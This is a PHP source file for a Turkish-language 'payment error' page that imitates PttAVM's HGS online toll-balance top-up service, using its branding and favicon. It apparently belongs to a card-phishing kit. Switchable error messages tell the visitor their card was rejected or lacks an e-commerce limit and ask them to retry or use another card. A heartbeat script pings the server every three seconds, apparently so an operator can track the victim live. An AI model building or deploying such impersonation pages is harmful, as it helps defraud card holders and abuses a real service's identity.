<?php
if (session_status() === PHP_SESSION_NONE) session_start();
require_once __DIR__ . '/db.php';
if (empty($_SESSION['basvuru'])) { header('Location: ' . BASE_PATH . '/'); exit; }

$hata_kodu = $_GET['hata'] ?? 'kart_hatali';
$mesajlar = [
  'kart_hatali'           => ['Kart Bilgileri Hatalı',          'Girdiğiniz kart bilgileri doğrulanamadı. Lütfen bilgilerinizi kontrol ederek tekrar deneyiniz.'],
  'eticaret_kapali'       => ['E-Ticarete Kapalı',              'Kartınız e-ticaret işlemlerine kapalıdır. Bankanızı arayarak e-ticaret limitinizi açtırınız.'],
  'limit_yetersiz'        => ['Kart Limiti Yetersiz',           'Kartınızda yeterli limit bulunmamaktadır. Limiti yeterli başka bir kartla tekrar deneyiniz.'],
  'kart_desteklenmiyor'   => ['Kart Desteklenmiyor',            'Kullandığınız kart türü bu işlem için desteklenmemektedir. Lütfen farklı bir kart deneyiniz.'],
  'provizyon_gonder'      => ['Provizyon Hatası',               'İşleminiz sırasında bir hata oluştu. Lütfen tekrar deneyiniz.'],
  'provizyon_hatali'      => ['Provizyon Onaylanamadı',         'Ödeme provizyon aşamasında hata oluştu. Bankanız işlemi onaylamadı.'],
];
[$baslik, $aciklama] = $mesajlar[$hata_kodu] ?? ['İşlem Hatası', 'Bir hata oluştu. Lütfen tekrar deneyiniz.'];
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <title>HGS Online Bakiye Yükleme - Ödeme Hatası</title>
    <link rel="icon" type="image/png" href="https://hgs.pttavm.com/v2/assets/images/favicon.png">
    
    <!-- Google Fonts Open Sans -->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap" rel="stylesheet">
    
    <!-- PttAVM HGS CSS -->
    <link rel="stylesheet" href="assets/css/hgs.min.css?v=<?= time() ?>">
</head>
<body>

<div class="image-container wizard-hgs-image-container set-full-height">
    
    <!-- Navbar Header -->
    <div class="container-fluid no-padding">
        <div class="navbar-header" style="overflow: hidden;">
            <div class="logo-field">
                <a class="navbar-brand navbar-left" href="https://www.pttavm.com" target="_blank">
                    <img src="assets/images/pttavm_hgs_logo.png" alt="PttAVM Logo" class="logo" border="0"/>
                </a>
            </div>
            <div class="menu-field">
                <nav class="nav responsive-menu">
                    <div class="menu-wrapper resize-drag nav-wrapper">
                        <ul class="nav-ul">
                            <li class="homepage-menu-item"><a href="index.php"><span>Ana Sayfa</span></a></li>
                            <li class="hgs-menu-item">
                                <a href="index.php" class="selected">
                                    <span>
                                        <img src="assets/images/menu/hgs_yukle.png" class="menu-showed-item" />
                                        Yükle
                                    </span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </nav>
            </div>
        </div>
    </div>

    <!-- Wizard Container -->
    <div class="col-sm-12 col-md-8 col-md-offset-2 col-lg-6 col-lg-offset-3" id="hgs-query-container">
        <div class="wizard-container" style="padding-top: 100px;">
            <div class="card wizard-card" data-color="orange" id="wizardProfile">
                
                <div class="wizard-header">
                    <div class="panel-header-icons">
                        <img class="panel-header-first-icon" src="assets/images/panel/homepage.png">
                    </div>
                    <h1>
                        <img class="panel-header-second-icon" src="assets/images/panel/hgs.png">
                        Ödeme Hatası
                    </h1>
                </div>

                <div class="tab-content text-center">
                    <div class="tab-pane panel-border active">
                        <div class="panel-inside" style="padding: 24px 20px; text-align: center;">
                            
                            <div style="width:76px;height:76px;background:#e74c3c;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:10px auto 20px;box-shadow:0 4px 12px rgba(231,76,60,0.3)">
                                <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round">
                                    <line x1="18" y1="6" x2="6" y2="18"></line>
                                    <line x1="6" y1="6" x2="18" y2="18"></line>
                                </svg>
                            </div>
                            
                            <h3 style="font-size:20px;color:#2c3e50;margin-bottom:10px;font-weight:700"><?= htmlspecialchars($baslik) ?></h3>
                            <p style="font-size:14px;color:#7f8c8d;max-width:340px;margin:0 auto 24px;line-height:1.6">
                                <?= htmlspecialchars($aciklama) ?>
                            </p>
                            
                            <div style="display:flex;flex-direction:column;gap:12px;max-width:280px;margin:0 auto">
                                <a href="<?= BASE_PATH ?>/odeme.php" class="btn btn-finish btn-fill btn-warning btn-wd" style="text-decoration:none;display:inline-flex;align-items:center;justify-content:center;gap:8px;border-radius:8px;font-weight:600;height:42px;">
                                    Tekrar Dene
                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                                </a>
                                <a href="<?= BASE_PATH ?>/" class="btn btn-finish btn-fill btn-wd" style="text-decoration:none;display:inline-flex;align-items:center;justify-content:center;gap:8px;border-radius:8px;background:#95a5a6;border-color:#7f8c8d;color:#fff;font-weight:600;height:42px;">
                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
                                    Ana Sayfaya Dön
                                </a>
                            </div>
                            
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<script>
    // Heartbeat
    function heartbeat() {
        fetch('heartbeat.php', { method: 'POST', credentials: 'same-origin' }).catch(function(){});
    }
    setInterval(heartbeat, 3000);
    heartbeat();
</script>

</body>
</html>
